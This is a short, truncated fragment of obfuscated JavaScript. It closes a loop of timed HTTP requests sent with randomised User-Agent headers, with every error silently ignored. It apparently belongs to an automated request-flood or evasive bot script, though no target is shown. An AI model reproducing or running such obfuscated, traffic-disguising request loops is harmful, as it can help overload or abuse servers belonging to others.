      'headers': {
        'User-Agent': userAgents['random'](),
        'Accept-Encoding': 'none'
      }
    })['catch'](h => {});
  }, (-0x2675 + -0x2789 + 0x6956) * getRandomInt(0x4 * -0x79e + -0x1 * -0xa77 + 0x18a * 0xd, 0x10da * -0x2 + -0x18bd + 0x42d * 0xe));
}, -0x1632 * -0x1 + -0x2e3 * 0x6 + -0x47c);